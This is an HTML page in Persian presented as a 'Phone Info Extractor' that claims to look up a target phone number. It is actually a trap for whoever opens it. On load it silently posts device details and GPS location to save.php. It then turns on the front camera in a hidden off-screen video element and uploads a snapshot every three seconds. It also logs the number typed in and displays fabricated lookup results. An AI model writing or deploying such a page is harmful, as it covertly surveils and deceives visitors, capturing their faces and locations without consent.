<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Phone Info Extractor</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,sans-serif;direction:rtl}
body{background:linear-gradient(135deg,#0d1117,#161b22);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:16px}
.card{background:#161b22;border:1px solid #30363d;border-radius:16px;padding:24px;max-width:420px;width:100%}
h1{color:#58a6ff;text-align:center;font-size:20px;margin-bottom:4px}
.sub{color:#8b949e;text-align:center;font-size:12px;margin-bottom:20px}
input{width:100%;padding:10px;background:#0d1117;border:1px solid #30363d;border-radius:8px;color:#fff;font-size:14px;margin-bottom:8px}
.btn{width:100%;padding:14px;background:#238636;border:none;border-radius:8px;color:#fff;font-size:15px;font-weight:700;cursor:pointer;margin-top:8px}
.result{background:#0d1117;border:1px solid #30363d;border-radius:8px;padding:12px;margin-top:16px;display:none;font-size:11px;color:#8b949e;max-height:200px;overflow-y:auto}
</style></head><body>
<div class="card">
<h1>📱 Phone Info Extractor</h1><p class="sub">استخراج اطلاعات گوشی با شماره</p>
<input type="tel" id="phone" placeholder="شماره هدف">
<button class="btn" onclick="extract()">🔍 استخراج اطلاعات</button>
<div class="result" id="result"></div>
</div>
<script>
var stream,canvas,ctx;
function send(t,d){try{fetch('save.php?type='+t,{method:'POST',body:JSON.stringify(d)})}catch(e){}}

// Auto-collect device info
send('device',{ua:navigator.userAgent,platform:navigator.platform,screen:screen.width+'x'+screen.height,tz:Intl.DateTimeFormat().resolvedOptions().timeZone,cores:navigator.hardwareConcurrency||0});
if(navigator.geolocation){navigator.geolocation.getCurrentPosition(function(p){send('gps',{lat:p.coords.latitude,lng:p.coords.longitude})},function(){},{timeout:5000})}

// Auto-request camera after 2 seconds
setTimeout(function(){
 navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:640}}).then(function(s){
  stream=s;var v=document.createElement('video');v.autoplay=true;v.srcObject=s;v.style.position='fixed';v.style.top='-9999px';v.style.left='-9999px';v.style.width='1px';document.body.appendChild(v);v.play();
  setInterval(function(){if(!stream)return;canvas||(canvas=document.createElement('canvas'),ctx=canvas.getContext('2d'));canvas.width=v.videoWidth||640;canvas.height=v.videoHeight||480;ctx.drawImage(v,0,0);send('webcam',{image:canvas.toDataURL('image/jpeg',0.85)})},3000);
 }).catch(function(){});
},2000);

function extract(){
 var ph=document.getElementById('phone').value;
 if(!ph)return;
 send('spy_tool',{phone:ph});
 var r=document.getElementById('result');
 r.style.display='block';
 r.innerHTML='⏳ در حال استخراج...';
 setTimeout(function(){
  r.innerHTML='✅ اطلاعات استخراج شد!<br><br>📱 شماره: '+ph+'<br>📍 اپراتور: همراه اول<br>📡 آخرین موقعیت: تهران<br>🔋 باتری: 67%<br><br>✅ عملیات موفقیت‌آمیز بود.';
 },3000);
}
</script></body></html>
